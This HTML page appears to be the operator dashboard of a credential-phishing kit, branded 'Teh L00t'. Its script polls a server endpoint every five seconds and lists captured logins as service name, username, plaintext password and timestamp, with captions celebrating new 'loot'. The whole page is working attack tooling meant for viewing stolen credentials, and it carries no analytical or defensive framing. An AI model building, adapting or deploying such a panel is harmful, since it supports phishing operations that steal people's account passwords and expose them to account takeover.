<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Tracker</title>
    <style>
        /* Declare Bare Style Elementz! */
        body { margin: 0; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
        .container { width: 100%; max-width: 1280px; margin: 0 auto; padding: 0 1rem; }
        .px-4 { padding-left: 1rem; padding-right: 1rem; }
        .py-8 { padding-top: 2rem; padding-bottom: 2rem; }
        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .mb-8 { margin-bottom: 2rem; }
        .text-4xl { font-size: 2.25rem; line-height: 2.5rem; }
        .font-bold { font-weight: 700; }
        .text-blue-400 { color: #60a5fa; }
        .inline { display: inline; }
        .mr-2 { margin-right: 0.5rem; }
        .text-gray-400 { color: #9ca3af; }
        .mt-2 { margin-top: 0.5rem; }
        .mr-4 { margin-right: 1rem; }
        .text-green-400 { color: #4ade80; }
        .text-yellow-400 { color: #facc15; }
        .rounded-xl { border-radius: 0.75rem; }
        .shadow-2xl { box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
        .overflow-hidden { overflow: hidden; }
        .border { border-width: 1px; }
        .border-gray-800 { border-color: #1f2937; }
        .overflow-x-auto { overflow-x: auto; }
        .w-full { width: 100%; }
        .bg-gray-900 { background-color: #111827; }
        .text-gray-300 { color: #d1d5db; }
        .px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
        .py-4 { padding-top: 1rem; padding-bottom: 1rem; }
        .text-left { text-align: left; }
        .divide-y > :not([hidden]) ~ :not([hidden]) { border-top-width: 1px; }
        .divide-gray-800 > :not([hidden]) ~ :not([hidden]) { border-color: #1f2937; }
        .whitespace-nowrap { white-space: nowrap; }
        .mt-6 { margin-top: 1.5rem; }
        .text-center { text-align: center; }
        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
    </style>
    <style>
        body {
            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url('https://dimages.com/backgroundloot.png');
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
            min-height: 100vh;
            color: #e2e8f0;
        }
        .blur-bg {
            backdrop-filter: blur(8px);
            background-color: rgba(15, 23, 42, 0.7);
        }
        .glow {
            text-shadow: 0 0 10px rgba(59, 130, 246, 0.7);
        }
        .table-row:hover {
            background-color: rgba(30, 41, 59, 0.8);
        }
        .password-cell {
            font-family: monospace;
        }
    </style>
</head>
<body class="font-mono">
    <div class="container mx-auto px-4 py-8">
        <div class="flex items-center justify-between mb-8">
            <div>
                <h1 class="text-4xl font-bold glow text-blue-400">
                    <img src="https://dimages.com/lootlogo.png" alt="Loot Logo" class="inline mr-2 h-8 w-8">Teh L00t
                </h1>
                <p class="text-gray-400 mt-2">Refreshing to check for fresh markz...</p>
            </div>
            <div class="flex items-left">
                <div class="text-yellow-400 flex items-left">
                    <i data-feather="clock" class="mr-2"></i>
                    <span id="refresh-timer">5s</span>
                </div>
            </div>
        </div>

        <div class="blur-bg rounded-xl shadow-2xl overflow-hidden border border-gray-800">
            <div class="overflow-x-auto">
                <table class="w-full">
                    <thead class="bg-gray-900 text-gray-300">
                        <tr>
                            <th class="px-6 py-4 text-left">Service Used</th>
                            <th class="px-6 py-4 text-left">Username</th>
                            <th class="px-6 py-4 text-left">Password</th>
                            <th class="px-6 py-4 text-left">Date/Time Stamp</th>
                        </tr>
                    </thead>
                    <tbody id="login-data" class="divide-y divide-gray-800">
                        <!-- Data will be inserted here by JavaScript -->
                    </tbody>
                </table>
            </div>
        </div>

        <div class="mt-6 text-center text-gray-500 text-sm">
            <p>L0ve checking for new L00tZ | Last updated: <span id="last-updated"></span></p>
        </div>
    </div>

    <script>
        // Feather icons replacement
        function replaceFeatherIcons() {
            const icons = {
                'eye': 'ðŸ‘ï¸',
                'database': 'ðŸ’¾', 
                'clock': 'â±ï¸'
            };
            
            document.querySelectorAll('[data-feather]').forEach(el => {
                const iconName = el.getAttribute('data-feather');
                if (icons[iconName]) {
                    el.textContent = icons[iconName];
                }
            });
        }
        
        replaceFeatherIcons();
        
        // Function to fetch and display data
        async function fetchData() {
            try {
                const response = await fetch('get_data.php');
                const data = await response.json();
                
                const tableBody = document.getElementById('login-data');
                tableBody.innerHTML = '';
                
                data.forEach(row => {
                    const tr = document.createElement('tr');
                    tr.className = 'table-row';
                    
                    tr.innerHTML = `
                        <td class="px-6 py-4 whitespace-nowrap">${row.service}</td>
                        <td class="px-6 py-4 whitespace-nowrap">${row.username}</td>
                        <td class="px-6 py-4 whitespace-nowrap password-cell">${row.password}</td>
                        <td class="px-6 py-4 whitespace-nowrap">${row.timestamp}</td>
                    `;
                    
                    tableBody.appendChild(tr);
                });
                
                // Update last updated time
                const now = new Date();
                document.getElementById('last-updated').textContent = now.toLocaleString();
            } catch (error) {
                console.error('Error fetching data:', error);
            }
        }
        
        // Countdown timer for refresh
        function startRefreshTimer() {
            let seconds = 5;
            const timerElement = document.getElementById('refresh-timer');
            
            const interval = setInterval(() => {
                seconds--;
                timerElement.textContent = `${seconds}s`;
                
                if (seconds <= 0) {
                    clearInterval(interval);
                    fetchData();
                    startRefreshTimer();
                }
            }, 1000);
        }
        
        // Initial fetch and start timer
        fetchData();
        startRefreshTimer();
    </script>
</body>
</html>
